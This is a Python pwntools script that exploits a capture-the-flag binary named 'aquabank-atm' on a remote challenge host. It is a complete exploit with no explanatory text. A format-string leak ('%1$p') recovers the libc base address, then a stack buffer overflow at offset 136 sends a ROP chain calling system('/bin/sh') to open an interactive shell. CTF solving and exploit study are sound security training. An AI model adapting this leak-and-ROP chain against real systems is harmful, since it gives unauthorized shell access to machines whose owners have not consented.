#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./aquabank-atm',checksec=False)
libc = ELF('./libc.so.6', checksec = False) #/usr/lib/x86_64-linux-gnu/libc.so.6

OFFSET = 136                        #found with cyclic(200)
ret_gadget = 0x000000000040101a
pop_rdi_ret_base = 0x000000000010f78b    #inside libc


def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r,gdbscript='''
                       break withdraw
                       continue ''')
            #pause()
    else: 
        r = remote('offsec.m0lecon.it',13558)
    return r

def main():
    p = conn()
    print(hex(libc.symbols['_IO_2_1_stdout_']))
    #phase 1: format string attack
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'note: ')
    p.sendline(b'A'*4 + b'.%1$p')
    
    #find the libc base address
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'---\n')
    leak = int(p.recvline().decode().split('.')[1],16) #this is _IO_2_1_stdout_+131
    print(hex(leak))
    libc.address = leak - libc.symbols['_IO_2_1_stdout_'] - 131
    log.info(f"libc address found: {libc.address:#x}")

    #ROP chain
    p.recvuntil(b'> ')
    p.sendline(b'3')

    for _ in range(2):
        p.recvuntil(b':')
        p.sendline(b'')
    
    p.recvuntil(b'):\n')
    pop_rdi_ret = pop_rdi_ret_base + libc.address
    bin_sh   = next(libc.search(b'/bin/sh'))
    log.info(f"'/bin/sh' string found at: {bin_sh:#x}")
    system = libc.symbols['system']

    payload = flat(
        b'A' * OFFSET,
        p64(ret_gadget),
        p64(pop_rdi_ret),
        p64(bin_sh),
        p64(system)
    )
    #pause()
    p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    main()